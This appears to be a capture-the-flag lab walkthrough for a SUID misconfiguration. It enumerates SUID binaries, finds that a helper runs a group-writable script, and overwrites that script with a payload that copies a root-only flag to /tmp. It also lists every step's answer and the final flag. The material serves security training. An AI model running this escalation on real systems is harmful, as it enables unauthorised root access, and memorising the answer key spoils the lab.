# SUID Runner Misconfiguration (Medium)

## Goal

Find a SUID maintenance helper, modify the script it executes, and capture:

```text
FLAG{suid_runner_misconfig}
```

## Platform Session

Open the terminal from the lab platform. The commands below are meant to be executed directly in the provided `student` shell.

## Step 1. Find The SUID Helper

Enumerate SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

The custom vulnerable helper is:

```text
/usr/local/bin/maint-runner
```

Submit for step 1:

```text
/usr/local/bin/maint-runner
```

## Step 2. Find The Writable Script

Inspect the helper and the maintenance directory:

```bash
strings /usr/local/bin/maint-runner
ls -l /opt/maint/run-check.sh
id
```

The helper executes:

```text
/opt/maint/run-check.sh
```

The file is writable by the `maint` group, and `student` is a member of that group.

Submit for step 2:

```text
/opt/maint/run-check.sh
```

## Step 3. Inject A Payload And Capture The Flag

Replace the check script with a payload that copies the root flag to a readable location:

```bash
cat > /opt/maint/run-check.sh <<'EOF'
#!/bin/bash
cat /root/flag.txt > /tmp/flag.txt
chmod 644 /tmp/flag.txt
EOF
chmod +x /opt/maint/run-check.sh
```

Run the SUID helper:

```bash
/usr/local/bin/maint-runner
```

Read the copied flag:

```bash
cat /tmp/flag.txt
```

Submit:

```text
FLAG{suid_runner_misconfig}
```
